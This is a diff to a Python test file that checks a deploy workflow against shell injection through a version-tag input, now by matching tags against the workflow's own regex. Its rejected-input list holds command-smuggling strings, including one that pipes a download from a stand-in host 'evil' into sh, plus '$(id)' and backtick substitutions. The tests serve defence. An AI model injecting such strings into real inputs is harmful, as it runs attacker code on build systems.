@@ -1,7 +1,6 @@
 """deploy-prod.yml must not interpolate dispatch inputs into shell (#1910)."""
 
 import re
-import subprocess
 from pathlib import Path
 
 import yaml
@@ -31,16 +30,23 @@ def test_version_tag_reaches_the_script_only_via_env():
     assert "github.event.inputs.version_tag" in step["env"]["INPUT_VERSION_TAG"]
 
 
-def _validate(tag: str) -> int:
-    """Run the step's own validation lines against a candidate tag."""
+def _tag_pattern() -> re.Pattern:
+    """The container-tag pattern the step itself enforces, read from the workflow so it cannot drift."""
     script = _build_step()["run"]
-    head = script.split("set -x", 1)[0]
-    env = {"INPUT_VERSION_TAG": tag, "COMMIT_SHA": "a" * 40, "PATH": "/usr/bin:/bin"}
-    return subprocess.run(["bash", "-c", head], env=env, capture_output=True).returncode
+    match = re.search(r'\[\[ "\$TAG" =~ (\^\S+\$) \]\]', script)
+    assert match, "tag validation missing from the build step"
+    return re.compile(match.group(1))
 
 
 def test_valid_tags_pass_and_hostile_tags_are_rejected():
-    for good in ("v1.2.3", "release_2026-11", "", "a" * 40):
-        assert _validate(good) == 0, good
-    for bad in ('x"; curl evil|sh; echo "', "$(id)", "a b", "-rf", ".hidden", "a/b", "`id`", "x\nid"):
-        assert _validate(bad) != 0, bad
+    pattern = _tag_pattern()
+    for good in ("v1.2.3", "release_2026-11", "a" * 40, "A", "0.1"):
+        assert pattern.fullmatch(good), good
+    for bad in ('x"; curl evil|sh; echo "', "$(id)", "a b", "-rf", ".hidden", "a/b", "`id`", "x\nid", "a" * 129, "tag\n"):
+        assert not pattern.fullmatch(bad), bad
+
+
+def test_an_empty_input_defaults_to_the_commit_sha_before_validation():
+    script = _build_step()["run"]
+    assert 'TAG="${INPUT_VERSION_TAG:-$COMMIT_SHA}"' in script
+    assert script.index('TAG="${INPUT_VERSION_TAG:-$COMMIT_SHA}"') < script.index("=~")
